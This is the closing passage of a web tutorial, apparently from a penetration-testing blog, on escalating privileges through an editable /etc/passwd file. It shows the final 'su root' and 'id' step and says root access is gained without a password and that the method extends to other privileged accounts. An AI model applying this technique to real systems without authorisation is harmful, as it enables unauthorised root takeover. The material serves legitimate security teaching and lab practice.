<p class="ai-optimize-131"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8bQxyVQ-dNu7Boc5WSTJD4-L1x8hgTrolGh0D-5-3X-vtVrOFilsqlabK-iwVkWCs0ERU9PYts98ZahGs8avt9dXqDdksj4oRJwNe9bS4vS-uXP-874EQfsJYTaRpDqJCkXy6FskLErU48apb9CUnFdrnzQOTuRysNeXLnGzDVJfKvQPi7QpmfZSBYrw7/s16000/27.png"/></span></p>
<p class="ai-optimize-132"><span style="color: #000000;">Now, switch to root user</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su root
id</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipiTvqflz5rvTbF27HzRZvnSUEvSLAjQNmbFAUd0YA_S0-vGujEWoS4X04HfJuHAHdU9WOpl27m4-t9xjNed8dUukkd3-TBFOpDxrKydY_eiatZoAYhlSLPQHCyky8R5dnEjU3MZbXgxCEFrw-H5y8U5I3LFi-klOFMQeuzfHv0cNntxG0H-D6D3rcQ32o/s16000/28.png"/></p>
<p class="ai-optimize-133"><span style="color: #000000;">Boom… you have the root access without passwd. You can use this method on other high privilege user roles.</span></p>
<p class="ai-optimize-134"><span style="color: #000000;">Hence there are so many ways to escalate privileges via editable /etc/passwd.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-135"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contac</span>t<strong><a href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
